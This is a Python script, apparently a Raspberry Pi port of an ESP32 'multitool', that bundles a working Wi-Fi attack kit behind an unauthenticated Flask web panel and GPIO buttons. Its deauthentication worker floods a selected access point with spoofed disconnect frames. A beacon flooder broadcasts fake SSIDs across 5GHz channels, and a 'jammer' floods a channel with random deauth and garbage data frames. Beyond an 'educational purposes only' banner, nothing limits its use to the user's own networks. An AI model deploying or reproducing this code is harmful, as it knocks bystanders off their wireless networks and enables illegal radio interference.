#!/usr/bin/env python3
"""
ESP32 Multitool -> Raspberry Pi 4 Python Port
5GHz WiFi Jammer + Web Interface + GPIO Button Control
Educational purposes only!
"""

import os
import sys
import time
import json
import threading
import subprocess
from datetime import datetime
from flask import Flask, render_template, jsonify, request
from flask_socketio import SocketIO, emit
import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap

# GPIO для кнопки (если доступно)
try:
    import RPi.GPIO as GPIO
    GPIO_AVAILABLE = True
except ImportError:
    GPIO_AVAILABLE = False
    print("[WARN] RPi.GPIO not available - button control disabled")

# ======================== КОНФИГУРАЦИЯ ========================

BTN_NAV_PIN = 17  # GPIO17 - переключение модулей
BTN_ACT_PIN = 27  # GPIO27 - старт/стоп
LED_PIN = 22      # GPIO22 - статус LED

WIFI_INTERFACE = "wlan0"  # Основной WiFi интерфейс
MONITOR_INTERFACE = "wlan0mon"  # Monitor mode интерфейс

# ======================== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ========================

app = Flask(__name__)
app.config['SECRET_KEY'] = 'esp32_multitool_secret'
socketio = SocketIO(app, cors_allowed_origins="*")

class ToolState:
    def __init__(self):
        self.current_module = 0  # 0=Home
        self.module_running = False
        self.module_names = [
            "Home", "WiFi Scan", "WiFi Sniffer", "WiFi Deauth",
            "Beacon Flood", "Probe Monitor", "5GHz Jammer", "System Info"
        ]
        
        # WiFi Scan
        self.networks = []
        
        # Sniffer
        self.pkt_total = 0
        self.pkt_mgmt = 0
        self.pkt_data = 0
        self.pkt_ctrl = 0
        self.pkt_deauth = 0
        self.pkt_beacon = 0
        self.sniff_channel = 36  # 5GHz channel
        
        # Deauth
        self.deauth_target = -1
        self.deauth_sent = 0
        
        # Beacon Flood
        self.beacons_sent = 0
        
        # Probe Monitor
        self.probes = []
        
        # 5GHz Jammer
        self.jam_channel = 36
        self.jam_active = False
        
        # Threads
        self.worker_thread = None
        self.stop_flag = threading.Event()
        
        # Monitor mode
        self.monitor_enabled = False

state = ToolState()

# ======================== WIFI UTILITIES ========================

def enable_monitor_mode():
    """Включить monitor mode на WiFi адаптере"""
    if state.monitor_enabled:
        return True
    
    try:
        # Остановить NetworkManager
        subprocess.run(['sudo', 'systemctl', 'stop', 'NetworkManager'], 
                      capture_output=True, timeout=5)
        
        # Убить процессы которые могут мешать
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                      capture_output=True, timeout=5)
        
        # Включить monitor mode
        subprocess.run(['sudo', 'ip', 'link', 'set', WIFI_INTERFACE, 'down'], 
                      capture_output=True, timeout=5)
        subprocess.run(['sudo', 'iw', WIFI_INTERFACE, 'set', 'monitor', 'none'], 
                      capture_output=True, timeout=5)
        subprocess.run(['sudo', 'ip', 'link', 'set', WIFI_INTERFACE, 'up'], 
                      capture_output=True, timeout=5)
        
        state.monitor_enabled = True
        print(f"[MONITOR] Enabled on {WIFI_INTERFACE}")
        return True
    except Exception as e:
        print(f"[ERROR] Monitor mode failed: {e}")
        return False

def disable_monitor_mode():
    """Выключить monitor mode"""
    if not state.monitor_enabled:
        return
    
    try:
        subprocess.run(['sudo', 'ip', 'link', 'set', WIFI_INTERFACE, 'down'], 
                      capture_output=True, timeout=5)
        subprocess.run(['sudo', 'iw', WIFI_INTERFACE, 'set', 'type', 'managed'], 
                      capture_output=True, timeout=5)
        subprocess.run(['sudo', 'ip', 'link', 'set', WIFI_INTERFACE, 'up'], 
                      capture_output=True, timeout=5)
        subprocess.run(['sudo', 'systemctl', 'start', 'NetworkManager'], 
                      capture_output=True, timeout=5)
        
        state.monitor_enabled = False
        print("[MONITOR] Disabled")
    except Exception as e:
        print(f"[ERROR] Disable monitor failed: {e}")

def set_channel(channel, freq_band='5GHz'):
    """Установить канал WiFi"""
    try:
        if freq_band == '5GHz':
            freq = 5000 + (channel * 5)
        else:
            freq = 2407 + (channel * 5)
        
        subprocess.run(['sudo', 'iw', WIFI_INTERFACE, 'set', 'freq', str(freq)], 
                      capture_output=True, timeout=2)
        return True
    except Exception as e:
        print(f"[ERROR] Set channel failed: {e}")
        return False

# ======================== MODULE: WIFI SCAN ========================

def wifi_scan_5ghz():
    """Сканирование 5GHz сетей"""
    state.networks = []
    
    try:
        # Временно выключить monitor mode для сканирования
        was_monitor = state.monitor_enabled
        if was_monitor:
            disable_monitor_mode()
        
        # Сканирование через iwlist
        result = subprocess.run(
            ['sudo', 'iwlist', WIFI_INTERFACE, 'scan'],
            capture_output=True, text=True, timeout=10
        )
        
        # Парсинг результатов
        lines = result.stdout.split('\n')
        current_net = {}
        
        for line in lines:
            line = line.strip()
            if 'Cell' in line and 'Address:' in line:
                if current_net:
                    state.networks.append(current_net)
                current_net = {'bssid': line.split('Address: ')[1]}
            elif 'ESSID:' in line:
                ssid = line.split('ESSID:')[1].strip('"')
                current_net['ssid'] = ssid if ssid else '(hidden)'
            elif 'Channel:' in line:
                current_net['channel'] = int(line.split('Channel:')[1])
            elif 'Frequency:' in line and 'GHz' in line:
                freq = float(line.split('Frequency:')[1].split()[0])
                current_net['freq'] = freq
                current_net['band'] = '5GHz' if freq > 5.0 else '2.4GHz'
            elif 'Signal level=' in line:
                rssi = line.split('Signal level=')[1].split()[0]
                current_net['rssi'] = int(rssi)
            elif 'Encryption key:' in line:
                current_net['encrypted'] = 'on' in line
        
        if current_net:
            state.networks.append(current_net)
        
        # Фильтр только 5GHz
        state.networks = [n for n in state.networks if n.get('band') == '5GHz']
        
        if was_monitor:
            enable_monitor_mode()
        
        print(f"[SCAN] Found {len(state.networks)} 5GHz networks")
        
    except Exception as e:
        print(f"[ERROR] WiFi scan failed: {e}")
    
    # Отправить результаты клиентам
    socketio.emit('wifi_scan', {'nets': state.networks})

# ======================== MODULE: WIFI SNIFFER ========================

def packet_handler(pkt):
    """Обработчик пакетов для сниффера"""
    if not pkt.haslayer(Dot11):
        return
    
    state.pkt_total += 1
    
    # Определение типа пакета
    if pkt.type == 0:  # Management
        state.pkt_mgmt += 1
        if pkt.subtype == 8:  # Beacon
            state.pkt_beacon += 1
        elif pkt.subtype == 12:  # Deauth
            state.pkt_deauth += 1
    elif pkt.type == 1:  # Control
        state.pkt_ctrl += 1
    elif pkt.type == 2:  # Data
        state.pkt_data += 1

def sniffer_worker():
    """Поток сниффера"""
    print(f"[SNIFFER] Started on channel {state.sniff_channel}")
    enable_monitor_mode()
    set_channel(state.sniff_channel, '5GHz')
    
    # Сброс счётчиков
    state.pkt_total = 0
    state.pkt_mgmt = 0
    state.pkt_data = 0
    state.pkt_ctrl = 0
    state.pkt_deauth = 0
    state.pkt_beacon = 0
    
    try:
        scapy.sniff(iface=WIFI_INTERFACE, prn=packet_handler, 
                   stop_filter=lambda x: state.stop_flag.is_set(), 
                   timeout=1, store=False)
    except Exception as e:
        print(f"[ERROR] Sniffer: {e}")
    
    print("[SNIFFER] Stopped")

# ======================== MODULE: WIFI DEAUTH ========================

def deauth_worker():
    """Поток деаутентификации"""
    if state.deauth_target < 0 or state.deauth_target >= len(state.networks):
        print("[ERROR] Invalid deauth target")
        return
    
    target = state.networks[state.deauth_target]
    target_mac = target['bssid']
    channel = target.get('channel', 36)
    
    print(f"[DEAUTH] Target: {target['ssid']} ({target_mac}) on ch{channel}")
    
    enable_monitor_mode()
    set_channel(channel, '5GHz')
    
    state.deauth_sent = 0
    
    # Создание deauth пакета
    broadcast = "ff:ff:ff:ff:ff:ff"
    
    try:
        while not state.stop_flag.is_set():
            # Deauth от AP к клиентам
            pkt1 = RadioTap() / Dot11(addr1=broadcast, addr2=target_mac, addr3=target_mac) / Dot11Deauth(reason=7)
            # Deauth от клиентов к AP
            pkt2 = RadioTap() / Dot11(addr1=target_mac, addr2=broadcast, addr3=target_mac) / Dot11Deauth(reason=7)
            
            scapy.sendp(pkt1, iface=WIFI_INTERFACE, count=5, inter=0.01, verbose=False)
            scapy.sendp(pkt2, iface=WIFI_INTERFACE, count=5, inter=0.01, verbose=False)
            
            state.deauth_sent += 10
            time.sleep(0.1)
            
    except Exception as e:
        print(f"[ERROR] Deauth: {e}")
    
    print("[DEAUTH] Stopped")

# ======================== MODULE: BEACON FLOOD ========================

def beacon_flood_worker():
    """Поток флуда beacon-фреймами"""
    fake_ssids = [
        "Free_5G_WiFi", "Airport_5GHz", "Hotel_Guest_5G", "Starbucks_5G",
        "FBI_Surveillance_Van", "Pretty_Fly_for_a_WiFi", "Wu_Tang_LAN",
        "Bill_Wi_the_Science_Fi", "LAN_Solo", "The_Promised_LAN",
        "Virus_Distribution_Point", "Loading...", "404_Network_Unavailable",
        "Searching...", "Get_Off_My_LAN", "No_Free_WiFi_Here"
    ]
    
    print("[BEACON] Flood started")
    enable_monitor_mode()
    
    state.beacons_sent = 0
    channels_5ghz = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
    
    try:
        while not state.stop_flag.is_set():
            for ssid in fake_ssids:
                if state.stop_flag.is_set():
                    break
                
                channel = channels_5ghz[state.beacons_sent % len(channels_5ghz)]
                set_channel(channel, '5GHz')
                
                # Случайный MAC
                src_mac = f"{scapy.RandMAC()}"
                
                # Beacon frame
                dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', 
                             addr2=src_mac, addr3=src_mac)
                beacon = Dot11Beacon(cap='ESS+privacy')
                essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
                
                frame = RadioTap() / dot11 / beacon / essid
                
                scapy.sendp(frame, iface=WIFI_INTERFACE, count=1, verbose=False)
                state.beacons_sent += 1
                
                time.sleep(0.05)
                
    except Exception as e:
        print(f"[ERROR] Beacon flood: {e}")
    
    print("[BEACON] Stopped")

# ======================== MODULE: 5GHz JAMMER ========================

def jammer_5ghz_worker():
    """Глушилка 5GHz - отправка шума на канале"""
    print(f"[JAMMER] Started on 5GHz channel {state.jam_channel}")
    enable_monitor_mode()
    set_channel(state.jam_channel, '5GHz')
    
    jam_count = 0
    
    try:
        while not state.stop_flag.is_set():
            # Генерация случайных пакетов для создания помех
            for _ in range(10):
                if state.stop_flag.is_set():
                    break
                
                # Случайный MAC и данные
                src = scapy.RandMAC()
                dst = scapy.RandMAC()
                
                # Deauth frames
                pkt1 = RadioTap() / Dot11(addr1=dst, addr2=src, addr3=src) / Dot11Deauth(reason=7)
                
                # Data frames с мусором
                pkt2 = RadioTap() / Dot11(type=2, addr1=dst, addr2=src, addr3=src) / scapy.Raw(load=os.urandom(100))
                
                scapy.sendp([pkt1, pkt2], iface=WIFI_INTERFACE, inter=0.001, verbose=False)
                jam_count += 2
            
            # Периодически менять частоту в пределах канала
            if jam_count % 100 == 0:
                socketio.emit('jammer_update', {'packets': jam_count, 'channel': state.jam_channel})
            
            time.sleep(0.01)
            
    except Exception as e:
        print(f"[ERROR] Jammer: {e}")
    
    print(f"[JAMMER] Stopped (sent {jam_count} packets)")

# ======================== MODULE CONTROL ========================

def start_module(module_id):
    """Запуск модуля"""
    stop_current_module()
    
    state.current_module = module_id
    state.module_running = True
    state.stop_flag.clear()
    
    if module_id == 1:  # WiFi Scan
        threading.Thread(target=wifi_scan_5ghz, daemon=True).start()
    elif module_id == 2:  # Sniffer
        state.worker_thread = threading.Thread(target=sniffer_worker, daemon=True)
        state.worker_thread.start()
    elif module_id == 3:  # Deauth
        state.worker_thread = threading.Thread(target=deauth_worker, daemon=True)
        state.worker_thread.start()
    elif module_id == 4:  # Beacon Flood
        state.worker_thread = threading.Thread(target=beacon_flood_worker, daemon=True)
        state.worker_thread.start()
    elif module_id == 6:  # 5GHz Jammer
        state.worker_thread = threading.Thread(target=jammer_5ghz_worker, daemon=True)
        state.worker_thread.start()
    
    send_module_state()

def stop_current_module():
    """Остановка текущего модуля"""
    if not state.module_running:
        return
    
    state.stop_flag.set()
    
    if state.worker_thread and state.worker_thread.is_alive():
        state.worker_thread.join(timeout=2)
    
    state.module_running = False
    send_module_state()

def send_module_state():
    """Отправка состояния модулей"""
    socketio.emit('module_state', {
        'current': state.current_module,
        'running': state.module_running,
        'name': state.module_names[state.current_module]
    })

# ======================== GPIO BUTTON HANDLER ========================

def setup_gpio():
    """Настройка GPIO для кнопок"""
    if not GPIO_AVAILABLE:
        return
    
    GPIO.setmode(GPIO.BCM)
    GPIO.setup(BTN_NAV_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.setup(BTN_ACT_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.setup(LED_PIN, GPIO.OUT)
    
    # Обработчики нажатий
    GPIO.add_event_detect(BTN_NAV_PIN, GPIO.FALLING, 
                         callback=button_nav_callback, bouncetime=300)
    GPIO.add_event_detect(BTN_ACT_PIN, GPIO.FALLING, 
                         callback=button_act_callback, bouncetime=300)
    
    print("[GPIO] Buttons configured")

def button_nav_callback(channel):
    """Кнопка навигации - переключение модулей"""
    stop_current_module()
    state.current_module = (state.current_module + 1) % len(state.module_names)
    print(f"[BTN] NAV -> {state.module_names[state.current_module]}")
    send_module_state()
    
    # LED мигание
    if GPIO_AVAILABLE:
        for _ in range(state.current_module + 1):
            GPIO.output(LED_PIN, GPIO.HIGH)
            time.sleep(0.1)
            GPIO.output(LED_PIN, GPIO.LOW)
            time.sleep(0.1)

def button_act_callback(channel):
    """Кнопка действия - старт/стоп"""
    if state.module_running:
        stop_current_module()
        print("[BTN] ACT -> STOP")
    else:
        start_module(state.current_module)
        print(f"[BTN] ACT -> START {state.module_names[state.current_module]}")

# ======================== WEB ROUTES ========================

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/scan')
def api_scan():
    threading.Thread(target=wifi_scan_5ghz, daemon=True).start()
    return jsonify({'status': 'scanning'})

@app.route('/api/module/<int:mod_id>/start')
def api_start(mod_id):
    start_module(mod_id)
    return jsonify({'status': 'started', 'module': mod_id})

@app.route('/api/module/stop')
def api_stop():
    stop_current_module()
    return jsonify({'status': 'stopped'})

@app.route('/api/status')
def api_status():
    return jsonify({
        'current_module': state.current_module,
        'running': state.module_running,
        'monitor_enabled': state.monitor_enabled,
        'uptime': int(time.time())
    })

# ======================== WEBSOCKET HANDLERS ========================

@socketio.on('connect')
def handle_connect():
    print(f"[WS] Client connected")
    send_module_state()
    emit('system_info', {
        'platform': 'Raspberry Pi 4',
        'interface': WIFI_INTERFACE,
        'gpio': GPIO_AVAILABLE
    })

@socketio.on('disconnect')
def handle_disconnect():
    print(f"[WS] Client disconnected")

@socketio.on('command')
def handle_command(data):
    cmd = data.get('cmd')
    
    if cmd == 'scan':
        threading.Thread(target=wifi_scan_5ghz, daemon=True).start()
    elif cmd == 'start':
        mod_id = data.get('module', 0)
        start_module(mod_id)
    elif cmd == 'stop':
        stop_current_module()
    elif cmd == 'set_channel':
        state.sniff_channel = data.get('channel', 36)
        state.jam_channel = data.get('channel', 36)
    elif cmd == 'set_target':
        state.deauth_target = data.get('target', -1)

# Периодическая отправка статистики
def stats_updater():
    while True:
        time.sleep(1)
        if state.module_running:
            if state.current_module == 2:  # Sniffer
                socketio.emit('sniffer_stats', {
                    'total': state.pkt_total,
                    'mgmt': state.pkt_mgmt,
                    'data': state.pkt_data,
                    'ctrl': state.pkt_ctrl,
                    'deauth': state.pkt_deauth,
                    'beacon': state.pkt_beacon
                })
            elif state.current_module == 3:  # Deauth
                socketio.emit('deauth_stats', {
                    'sent': state.deauth_sent
                })
            elif state.current_module == 4:  # Beacon
                socketio.emit('beacon_stats', {
                    'sent': state.beacons_sent
                })

# ======================== MAIN ========================

def main():
    print("=" * 60)
    print("  ESP32 MULTITOOL -> RASPBERRY PI 4 PORT")
    print("  5GHz WiFi Jammer + Web Interface")
    print("  Educational purposes only!")
    print("=" * 60)
    
    # Проверка root
    if os.geteuid() != 0:
        print("[ERROR] This script must be run as root!")
        print("Usage: sudo python3 rpi_multitool.py")
        sys.exit(1)
    
    # Настройка GPIO
    if GPIO_AVAILABLE:
        setup_gpio()
    
    # Запуск потока статистики
    threading.Thread(target=stats_updater, daemon=True).start()
    
    print(f"[WEB] Starting server on http://0.0.0.0:80")
    print(f"[WIFI] Interface: {WIFI_INTERFACE}")
    print("[READY] Press Ctrl+C to stop")
    
    try:
        socketio.run(app, host='0.0.0.0', port=80, debug=False, allow_unsafe_werkzeug=True)
    except KeyboardInterrupt:
        print("\n[SHUTDOWN] Stopping...")
    finally:
        stop_current_module()
        disable_monitor_mode()
        if GPIO_AVAILABLE:
            GPIO.cleanup()

if __name__ == '__main__':
    main()
